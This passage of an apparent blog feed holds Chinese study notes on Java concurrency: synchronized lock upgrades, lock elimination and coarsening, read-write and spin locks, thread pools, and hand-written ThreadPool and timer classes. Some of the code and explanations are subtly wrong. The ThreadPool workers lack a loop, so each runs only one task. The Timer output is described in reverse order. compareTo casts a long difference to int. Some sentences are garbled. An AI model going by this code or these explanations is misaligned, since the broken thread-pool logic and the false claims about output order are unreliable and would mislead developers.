title="引入读写锁原因"></a>引入读写锁原因</h6><p>如果是两个线程在读那线程本身就是安全的不需要互斥.<br>如果使用synchronized这种方式加锁两个线程读会产生互斥，产生阻塞.（性能损失）<br>如果完全给读操作不加锁，一个线程读一个线程写，可能会读到写了一半的数据.<br>引入读写锁就可以解决.</p><h4 id="Synchronized锁的内部优化"><a href="#Synchronized锁的内部优化" class="headerlink" title="Synchronized锁的内部优化"></a>Synchronized锁的内部优化</h4><p>上述锁策略已经可以明确synchronized内部有一套自己优化的策略，使得synchronized能够适应多种情景.</p><p>当线程执行到未加锁的synchronized中的对象时会经历以下三个过程.<strong>目前来看此处的锁级别是不能降级的.</strong></p><h5 id="偏向锁（假设没线程来竞争锁）"><a href="#偏向锁（假设没线程来竞争锁）" class="headerlink" title="偏向锁（假设没线程来竞争锁）"></a>偏向锁（假设没线程来竞争锁）</h5><p><strong>核心思想是懒汉模式</strong>，在需要用到的时候才加锁，能晚加锁就晚加锁.但并<strong>未真正加锁，而是在线程上加一个轻量级的标记</strong>.如果没有其他线程来竞争就省去加锁操作，否则升级未轻量级操作.</p><h5 id="轻量级锁（假设竞争小）"><a href="#轻量级锁（假设竞争小）" class="headerlink" title="轻量级锁（假设竞争小）"></a>轻量级锁（假设竞争小）</h5><p>通过自旋锁实现.<br>优势：只要另外的线程释放锁就可以立马拿到锁.（坚持不懈的舔狗 bushi）<br>劣势：比较消耗CPU资源.<br>此阶段synchronized内部会统计当前这个锁对象上有多少个线程在参与竞争.如果竞争者较多就会升级到重量级锁.</p><h5 id="重量级锁（假设竞争大）"><a href="#重量级锁（假设竞争大）" class="headerlink" title="重量级锁（假设竞争大）"></a>重量级锁（假设竞争大）</h5><p>此时拿不到锁的线程不再进行自旋而是阻塞等待.<br>让出CPU使用权【防止CPU占用率过高】<br>当前线程释放锁时，系统会随机分配另一个线程来获取锁.</p><h6 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h6><p><strong>偏向锁到轻量级锁这个过程不涉及解锁，只是确保有偏向锁状态的线程先拿到锁（优先性）</strong><br><strong>偏向锁标记是每个对象头的一个属性，每个对象都有自己唯一的标记.当锁对象首次加锁时进入偏向锁状态，如果这个加锁过程没有涉及锁竞争下次加锁还是偏向锁，否则跳过偏向锁到下一级阶段（轻量级锁）.</strong></p><h5 id="锁消除策略"><a href="#锁消除策略" class="headerlink" title="锁消除策略"></a>锁消除策略</h5><p>编译器的一种优化方式.比那一起编译代码的时候遇到错误代码就不会加锁，而是自动把锁取消.<br>比如加锁代码中没有涉及到成员变量的修改只有一些局部变量是不用加锁的.<br><strong>针对一眼识别的完全不涉及线程安全问题的代码能够把锁消除掉.但是只有偏向锁运行起来才知道有没有锁冲突.</strong></p><h5 id="锁粗化"><a href="#锁粗化" class="headerlink" title="锁粗化"></a>锁粗化</h5><p>怎么分别此处的粗细？<br><strong>synchrionized{ }中的代码越少就认为锁的粒度越细包含的代码越多就认为锁的粒度越粗</strong><br>同样的，不同的场景需要的锁粗细粒度不同，视具体情况而定.<br><strong>锁粗化会将多个细粒度的锁,合并成一个粗粒度的锁,避免了重复加锁解锁的过程</strong></p><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><h6 id="1-怎么理解乐观锁和悲观锁的，具体怎么实现？"><a href="#1-怎么理解乐观锁和悲观锁的，具体怎么实现？" class="headerlink" title="1.怎么理解乐观锁和悲观锁的，具体怎么实现？"></a>1.怎么理解乐观锁和悲观锁的，具体怎么实现？</h6><p>悲观锁认为多个线程访问同⼀个共享变量冲突的概率较⼤, 会在每次访问共享变量之前都去真正加锁. 乐观锁认为多个线程访问同⼀个共享变量冲突的概率不⼤. 并不会真的加锁, ⽽是直接尝试访问数据. 在访问的同时识别当前的数据是否出现访问冲突. </p><p>悲观锁的实现就是先加锁(⽐如借助操作系统提供的 mutex), 获取到锁再操作数据. 获取不到锁就等待. 乐观锁的实现可以引⼊⼀个版本号. 借助版本号识别出当前的数据访问是否冲突. (实现细节参考上⾯ 的图). </p><h6 id="2-介绍读写锁"><a href="#2-介绍读写锁" class="headerlink" title="2.介绍读写锁"></a>2.介绍读写锁</h6><p>读写锁就是把读操作和写操作分别进⾏加锁. 读锁和读锁之间不互斥. 比特就业课 写锁和写锁之间互斥. 写锁和读锁之间互斥. 读写锁最主要⽤在 “频繁读, 不频繁写” 的场景中. </p><h6 id="3-什么是⾃旋锁，为什么要使⽤⾃旋锁策略，缺点是什么？"><a href="#3-什么是⾃旋锁，为什么要使⽤⾃旋锁策略，缺点是什么？" class="headerlink" title="3.什么是⾃旋锁，为什么要使⽤⾃旋锁策略，缺点是什么？"></a>3.什么是⾃旋锁，为什么要使⽤⾃旋锁策略，缺点是什么？</h6><p>如果获取锁失败, ⽴即再尝试获取锁, ⽆限循环, 直到获取到锁为⽌. 第⼀次获取锁失败, 第⼆次的尝试 会在极短的时间内到来. ⼀旦锁被其他线程释放, 就能第⼀时间获取到锁. 相⽐于挂起等待锁, 优点: 没有放弃 CPU 资源, ⼀旦锁被释放就能第⼀时间获取到锁, 更⾼效. 在锁持有时间⽐较短的场景 下⾮常有⽤. 缺点: 如果锁的持有时间较⻓, 就会浪费 CPU 资源. </p><h6 id="4-synchronized-是可重⼊锁吗？"><a href="#4-synchronized-是可重⼊锁吗？" class="headerlink" title="4.synchronized 是可重⼊锁吗？"></a>4.synchronized 是可重⼊锁吗？</h6><p>是可重⼊锁. 可重⼊锁指的就是连续两次加锁不会导致死锁. 实现的⽅式是在锁中记录该锁持有的线程⾝份, 以及⼀个计数器(记录加锁次数). 如果发现当前加锁的 线程就是持有锁的线程, 则直接计数⾃增.</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java多线程_0x8_</title>
      <link href="/2024/09/10/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%AF%87%E5%85%AB/"/>
      <url>/2024/09/10/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%AF%87%E5%85%AB/</url>
      
        <content type="html"><![CDATA[<h3 id="多线程篇八"><a href="#多线程篇八" class="headerlink" title="多线程篇八"></a>多线程篇八</h3><h4 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a>线程池</h4><h5 id="什么是线程池？"><a href="#什么是线程池？" class="headerlink" title="什么是线程池？"></a>什么是线程池？</h5><p>顾名思义，线程池是一个存放了很多线程的池子.既然有很多线程，那一定很方便调用对吧，有很多线程那大家一定喜欢一起玩吧（并发）.</p><p><strong>线程池是一种并发编程中常用的技术，用于管理和重用线程.</strong><br>线程池由线程池管理器、工作队列和线程池中的线程构成.</p><h6 id="线程池的优点"><a href="#线程池的优点" class="headerlink" title="线程池的优点"></a>线程池的优点</h6><p>由于进程的频繁创建和销毁带来的巨大开销，所以聪明的大佬们选择引入线程池或者更轻量级的协程（纤程）.<br><u>协程的本质室程序员再用户态代码中进行调度，不依赖内核.</u><br>纯用户态代码是基于线程封装过来的就比内核调用更加安全.<br>而引入线程池就能**减少每次启动、销毁线程的损耗.**【用完了也不用销毁，多次利用，喜欢用一辈子的奥特乐袋子！(bushi】</p><h5 id="标准库中线程池"><a href="#标准库中线程池" class="headerlink" title="标准库中线程池"></a>标准库中线程池</h5><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/e1997fd3e70b1efe6364bc7231ce5ee2.png" alt="img"><br><strong>Tips</strong></p><p>corePoolSize: 核心线程数(一个线程池里,最少有多少个线程)<br>maximumPoolSize :最大线程数(一个线程池中,最多有多少个线程)<br>keepAliveTime:线程空闲超过这个时间阈值,就会被销毁<br>unit:时间单位,取分钟,秒,小时等等<br>workQueue:和定时器相同,线程池也可以有很多任务,也可以设置为带有优先级的<br>ThreadFactory: 线程工厂,本质上是给new这个操作封装了一层,可能同名同参数的构造方法,这样构成不了重载,我们就想弥补一下这个缺陷,封装一层构造方法.</p><h6 id="拒绝策略【重点】"><a href="#拒绝策略【重点】" class="headerlink" title="拒绝策略【重点】"></a>拒绝策略【重点】</h6><p>一个线程池能容纳的任务数量有限，当持续添加任务的时候可能会超出上限，这时候拒绝策略就闪亮登场了.<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/b46dad933033ffa7e18a70b05d25b072.png" alt="img"></p><p>1.直接抛出异常，新任务和旧任务都罢工.<br>2.新任务由添加它的线程自己执行.<br>3.丢弃任务队列中最老的任务<br>4.丢弃当前新加的任务</p><h6 id="Excutors创建线程的几种方式"><a href="#Excutors创建线程的几种方式" class="headerlink" title="Excutors创建线程的几种方式"></a>Excutors创建线程的几种方式</h6><p>newFixedThreadPool:创建固定数目的线程池<br>newCacheThreadPool:创建线程数目动态增长的线程池(构造出的线程池对象都能动态适应 需要添加新任务时线程会根据需要自动被创建出来 并且可以在池中保留一段时间)<br>newSingleThreadExcutor：创建只包含单个线程的线程池<br>newScheduledThreadPool:设定延迟时间的执行命令&#x2F;定期执行命令(进阶版的定时器)</p><h5 id="线程池的实现"><a href="#线程池的实现" class="headerlink" title="线程池的实现"></a>线程池的实现</h5><p>上代码！</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ArrayBlockingQueue;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.BlockingQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ThreadPool</span> &#123;</span><br><span class="line">    <span class="comment">//用于保存线程,用于以后能取出线程并修改</span></span><br><span class="line">    <span class="keyword">private</span> List&lt;Thread&gt; ThreadList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="comment">//用于保存任务的队列</span></span><br><span class="line">    <span class="keyword">private</span> BlockingQueue&lt;Runnable&gt; queue = <span class="keyword">new</span> <span class="title class_">ArrayBlockingQueue</span>&lt;&gt;(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//通过这个方法,把这个任务添加到线程池中.</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">submit</span><span class="params">(Runnable runnable)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        queue.put(runnable);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//通过n指定创建多少个线程</span></span><br><span class="line">    <span class="comment">//创建了一个固定数量的线程池</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ThreadPool</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">Thread</span> <span class="variable">t</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">//取出一个任务,并执行</span></span><br><span class="line">                    <span class="type">Runnable</span> <span class="variable">runnable</span> <span class="operator">=</span> queue.take();</span><br><span class="line">                    runnable.run();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            t.start();</span><br><span class="line">            ThreadList.add(t);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">ThreadPool</span> <span class="variable">pool</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ThreadPool</span>(<span class="number">4</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> i;</span><br><span class="line">            pool.submit(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                    <span class="comment">//要执行的工作</span></span><br><span class="line">                    System.out.println(<span class="string">&quot;执行任务 &quot;</span> + n + <span class="string">&quot;, 当前线程为: &quot;</span> + Thread.currentThread().getId());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>使用线程池需要设置线程的数目为多少合适？</strong><br><u>一个线程执行的代码主要分为两类</u><br>1.CPU密集型(主要逻辑是算术运算&#x2F;逻辑判断)<br>2.IO密集型(主要是进行IO操作)</p><p>假设一个代码的所有代码都还是CPU密集型的这时线程池的数量不应该超过N（N是极限）设置比N更大这个时候久无法提高效率了.在CPU满的情况下无法提高效率此时增加线程反而增加更多的线程开销.<br>如果一个线程的所有代码是IO密集的，此时不用CPU，此时设置的线程数就可能超过N.较大的值可以用一个核心通过线程调用的方式并发执行.</p><p>正确的思路：<strong>线程池的线程数目与代码密切相关 所以通过实验的方式进行性能测试将代码修改成符合预期的状态</strong></p><h4 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h4><h5 id="对比线程和进程"><a href="#对比线程和进程" class="headerlink" title="对比线程和进程"></a>对比线程和进程</h5><h6 id="线程的优点"><a href="#线程的优点" class="headerlink" title="线程的优点"></a>线程的优点</h6><p>1.创建出一个新的线程比创建一个新进程的代价小得多.<br>2.与进程之间切换相比，线程之间切换很少需要OS<br>3.线程占用的资源更少（相比进程<br>4.可以充分利用多处理器的可并行数量<br>5.在等待IO操作结束的时候执行其他的计算任务<br>6.计算密集型应用，将计算分解到多个线程中实现<br>7.I&#x2F;O密集型应用为了提高性能将I&#x2F;O操作重置线程可以等待不同的I&#x2F;O操作</p><h6 id="进程和线程的区别"><a href="#进程和线程的区别" class="headerlink" title="进程和线程的区别"></a>进程和线程的区别</h6><p>1.进程是系统进行资源分配和调度的最小单位（独立的）线程数是最小的执行单位<br>2.进程有自己的内存空间，线程值独享指令执行的必要资源(比如寄存器和栈)<br>3.由于同一进程的各线程共享内存和文件资源，可以不通过内核直接俄通信.<br>4.线程的创建切换及终止效率高.</p><h5 id="保证线程安全的思路"><a href="#保证线程安全的思路" class="headerlink" title="保证线程安全的思路"></a>保证线程安全的思路</h5><p>1.使⽤没有共享资源的模型<br>2.适⽤共享资源只读，不写的模型<br>a. 不需要写共享资源的模型<br>b. 使⽤不可变对象<br>3.直⾯线程安全（重点）<br>a. 保证原⼦性<br>b. 保证顺序性<br>c. 保证可⻅性</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java多线程_0x7_</title>
      <link href="/2024/09/09/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%AF%87%E4%B8%83/"/>
      <url>/2024/09/09/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%AF%87%E4%B8%83/</url>
      
        <content type="html"><![CDATA[<h3 id="多线程篇七"><a href="#多线程篇七" class="headerlink" title="多线程篇七"></a>多线程篇七</h3><h4 id="定时器"><a href="#定时器" class="headerlink" title="定时器"></a>定时器</h4><h5 id="什么是定时器"><a href="#什么是定时器" class="headerlink" title="什么是定时器"></a>什么是定时器</h5><p>听到定时器，首先想到的是“闹钟”.到一个设置好的时间之后就执行某个指定好的代码.(在实际开发中非常常用，如网络通信【邮件发送】)<br>你在抢演唱会门票，已经到了支付页面，但是网突然崩了，页面显示让你等待，这下怎么办！！对于我们来说是不能无限的等待下去的，我们需要一个等待期限最好是尽快处理，此处的等待时间就通过定时器来实现了.</p><h5 id="标准库中的定时器"><a href="#标准库中的定时器" class="headerlink" title="标准库中的定时器"></a>标准库中的定时器</h5><p>标准库中提供了一个Timer类.其核心方法为<strong>schedule</strong>.(注意不要自命名Timer类)<br>schedule 包含两个参数. 第一个参数指定即将要执行的任务代码, 第二个参数指定多长时间之后 执行 (单位为毫秒). </p><p>上代码！</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Timer;</span><br><span class="line"><span class="keyword">import</span> java.util.TimerTask;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TimeKeeper</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Timer</span> <span class="variable">timer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Timer</span>();       <span class="comment">//匿名内部类 继承TimerTak并创建一个实例</span></span><br><span class="line">        timer.schedule(<span class="keyword">new</span> <span class="title class_">TimerTask</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;Hello Keeper!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="number">5000</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello Main!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行代码<br>![img](C:\Users\lenovo\Documents\Tencent Files\3023536144\nt_qq\nt_data\Pic\2024-09\Ori\8a40ecceb25dcde25fd4442e4454bce7.png)</p><p>发现先打印了”Hello Keeper!”等待五秒后打印’’Hellp Main”，Why？<br>可以通过代码观察到主线程执行schedule方法的时候讲Task放到timer对象中，timer中也包含一个线程(“扫描线程”，等待的时间到了就会执行安排给扫描线程的任务)</p><p>那怎么线程没有结束呢？上源码！<br>![img](C:\Users\lenovo\Documents\Tencent Files\3023536144\nt_qq\nt_data\Pic\2024-09\Ori\4c055341b2eb630f6ffd05b8976c2704.png)<br><u>Timer内部还有线程！</u><br><strong>一个Timer中是可以安排多个任务的</strong></p><h5 id="定时器的实现"><a href="#定时器的实现" class="headerlink" title="定时器的实现"></a>定时器的实现</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="comment">//任务描述块</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyTimerTask</span> <span class="keyword">implements</span> <span class="title class_">Comparable</span>&lt;MyTimerTask&gt; &#123;</span><br><span class="line">    <span class="comment">//需要一个执行的任务</span></span><br><span class="line">    <span class="keyword">private</span> Runnable runnable;</span><br><span class="line">    <span class="comment">//需要执行任务的时间</span></span><br><span class="line">    <span class="keyword">private</span>  <span class="type">long</span> time;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//传入“相对时间”</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyTimerTask</span><span class="params">(Runnable runnable,<span class="type">long</span> delay)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.runnable = runnable;</span><br><span class="line">        <span class="built_in">this</span>.time = System.currentTimeMillis() + delay;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compareTo</span><span class="params">(MyTimerTask o)</span> &#123;</span><br><span class="line">        <span class="comment">//这样写让队首元素是最小时间的值</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="type">int</span>)(<span class="built_in">this</span>.time - o.time);</span><br><span class="line">    <span class="comment">//最大反过来 通过尝试来判断</span></span><br><span class="line">        <span class="comment">//return o.time - this.time;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">long</span> <span class="title function_">getTime</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> time;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Runnable <span class="title function_">getRunnable</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> runnable;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyTimer</span> &#123;</span><br><span class="line">    <span class="comment">//存储任务的数据结构</span></span><br><span class="line">    <span class="keyword">private</span> PriorityQueue&lt;MyTimerTask&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;MyTimerTask&gt;();</span><br><span class="line">    <span class="comment">//使用这个对象作为锁对象</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">Object</span> <span class="variable">locker</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">schedule</span><span class="params">(Runnable runnable, <span class="type">long</span> delay)</span> &#123;</span><br><span class="line">        <span class="keyword">synchronized</span>(locker) &#123;</span><br><span class="line">            queue.offer(<span class="keyword">new</span> <span class="title class_">MyTimerTask</span>(runnable, delay));</span><br><span class="line">            locker.notify();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//扫描线程</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">MyTimer</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建线程</span></span><br><span class="line">    <span class="type">Thread</span> <span class="variable">t</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">        <span class="comment">//使用while 是为了在wait被唤醒时 再确认一下条件</span></span><br><span class="line">     <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">         <span class="keyword">try</span> &#123;</span><br><span class="line">             <span class="keyword">synchronized</span>(locker) &#123;</span><br><span class="line">                 <span class="keyword">while</span>(queue.isEmpty()) &#123;</span><br><span class="line">                     locker.wait();</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="comment">//比较当前队首元素是否可以执行了</span></span><br><span class="line">                 <span class="type">MyTimerTask</span> <span class="variable">task</span> <span class="operator">=</span> queue.peek();</span><br><span class="line">                 <span class="type">long</span> <span class="variable">curTime</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">                 <span class="keyword">if</span>(curTime &gt;= task.getTime()) &#123;</span><br><span class="line">                     <span class="comment">//达到时间可以执行</span></span><br><span class="line">                     task.getRunnable().run();</span><br><span class="line">                     <span class="comment">//执行完就可以从队列中delete</span></span><br><span class="line">                     queue.poll();</span><br><span class="line">                 &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                     <span class="comment">//没到执行任务的时间 等待下一次判定</span></span><br><span class="line">                     locker.wait(task.getTime() - curTime);</span><br><span class="line">                 &#125;</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;<span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">             <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    t.start();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//定时器</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TimeKeeper</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">MyTimer</span> <span class="variable">timer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyTimer</span>();</span><br><span class="line">        timer.schedule(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;5000&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="number">5000</span>);</span><br><span class="line">        timer.schedule(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;4000&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="number">4000</span>);</span><br><span class="line">        timer.schedule(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;3000&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="number">3000</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Game Start!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行得到<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240921113003059.png" alt="image-20240921113003059"></p><h6 id="思路分析"><a href="#思路分析" class="headerlink" 